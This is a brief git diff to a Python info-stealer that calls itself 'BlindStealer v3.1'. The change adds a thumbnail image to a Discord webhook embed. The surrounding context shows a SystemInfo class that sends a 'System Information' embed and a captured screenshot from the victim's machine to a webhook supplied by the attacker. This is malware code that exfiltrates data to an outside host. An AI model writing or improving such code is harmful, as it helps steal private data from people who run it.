@@ -16,6 +16,7 @@ class SystemInfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
         embed = Embed(title="System Information", color=0x24262A)
+        embed.set_thumbnail(url="https://i.imgur.com/LNVOaxg.png")
         embed.set_footer(text="Blind v3.1 · Created by: readdone#9772")
 
         embed.add_field(
@@ -59,6 +60,7 @@ class SystemInfo():
                 file=File('.\\screenshot.png', filename='screenshot.png'),
                 username="BlindStealer - v3.1",
                 avatar_url="https://i.imgur.com/LNVOaxg.png"
+                
             )
         except:
             pass
